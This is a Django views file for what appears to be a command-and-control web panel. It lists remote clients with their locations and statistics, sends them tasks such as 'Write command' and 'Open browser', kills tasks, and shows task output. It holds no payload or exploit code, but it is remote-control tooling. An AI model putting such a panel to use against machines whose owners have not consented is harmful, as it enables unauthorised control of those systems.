from django.shortcuts import render
from django.http import HttpResponseRedirect, JsonResponse
from .forms import clientForm
from .models import Client, SentTask
from .filters import ClientFilter, TaskFilter
from .server import ControlServerHandler
import json


def kill_task(request):
    # TODO: Send to control server
    return


def index(request):
    controlServer = ControlServerHandler()
    controlServer.getClients()

    tasks = [{'name': "Write command"}, {'name': "Open browser"}]

    if request.method == 'POST':
        form = clientForm(request.POST)
        if form.is_valid():
            print(request)
            controlServer.sendTasks(request)
            return HttpResponseRedirect(request.path_info)
    else:
        form = clientForm()

    statistics = controlServer.getStatistics()
    locations = controlServer.getLocations()
    locations = {'locations': locations}

    context = {'clients': Client.objects.all(),
               'tasks': tasks,
               'form': form,
               'statistics': statistics,
               'locations': json.dumps(locations),
               'filter': ClientFilter(request.GET, queryset=Client.objects.all())}

    return render(request, 'website/index.html', context, )



def tasks(request):
    controlServer = ControlServerHandler()
    controlServer.getTasks()

    if request.method == 'POST':
        controlServer.killTask(request)
        return HttpResponseRedirect(request.path_info)
    context = {'tasks': TaskFilter(request.GET, queryset=SentTask.objects.all().order_by('-id'))}
    return render(request, 'website/tasks.html', context)

def task_output(request):
    controlServer = ControlServerHandler()
    task_id = json.loads(request.body)['task_id']
    client_id = task_id[36:72]
    task_id = task_id[0:36]
    output = controlServer.getTaskOutput(task_id, client_id)
    taskOutput = {
        'output': output,
    }
    return JsonResponse(taskOutput)